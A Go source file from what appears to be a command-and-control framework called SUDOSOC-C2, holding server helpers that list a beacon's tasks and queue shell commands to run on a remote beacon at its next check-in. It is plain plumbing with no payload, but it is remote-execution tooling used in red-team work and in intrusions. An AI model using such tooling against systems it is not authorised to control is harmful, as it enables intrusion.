package web

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif
	Beacon task queue helpers
*/

import (
	"fmt"
	"strings"

	"google.golang.org/protobuf/proto"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/db"
)

// beaconTaskList returns tasks for a beacon ID as JSON-ready structs.
// beaconTaskJSON is defined in api_sessions.go (same package).
func beaconTaskList(beaconID string) ([]beaconTaskJSON, error) {
	tasks, err := db.BeaconTasksByBeaconID(beaconID)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch beacon tasks: %w", err)
	}

	out := make([]beaconTaskJSON, 0, len(tasks))
	for _, t := range tasks {
		out = append(out, beaconTaskJSON{
			ID:          t.ID,
			State:       t.State,
			Description: t.Description,
			CreatedAt:   t.CreatedAt,
			SentAt:      t.SentAt,
			CompletedAt: t.CompletedAt,
		})
	}
	return out, nil
}

// queueBeaconExecute creates a pending execute task on a beacon and persists it
// to the database so it will be delivered on the beacon's next check-in.
func queueBeaconExecute(beaconID string, command string) (map[string]interface{}, error) {
	if strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("empty command")
	}

	beacon, err := db.BeaconByID(beaconID)
	if err != nil || beacon == nil {
		return nil, fmt.Errorf("beacon not found: %s", beaconID)
	}

	// Use platform shell wrapper so pipes/quotes work correctly on all OS.
	// shellWrapExecReq is defined in ws_terminal.go (same package).
	execReq := shellWrapExecReq(beacon.OS, command, "")
	execReq.Request = &commonpb.Request{BeaconID: beacon.ID.String()}
	reqData, err := proto.Marshal(execReq)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal execute request: %w", err)
	}

	task, err := beacon.Task(&sudosocpb.Envelope{
		Type: sudosocpb.MsgExecuteReq,
		Data: reqData,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create beacon task: %w", err)
	}
	task.Description = fmt.Sprintf("execute: %s", command)

	if err := db.Session().Save(task).Error; err != nil {
		return nil, fmt.Errorf("failed to save beacon task: %w", err)
	}

	return map[string]interface{}{
		"task_id":     task.ID.String(),
		"state":       "pending",
		"description": task.Description,
		"queued_at":   task.CreatedAt.Unix(),
		"message":     fmt.Sprintf("Task queued for %s. Will execute on next check-in (interval: %ds).", beacon.Name, beacon.Interval/1000),
		"command":     command,
	}, nil
}
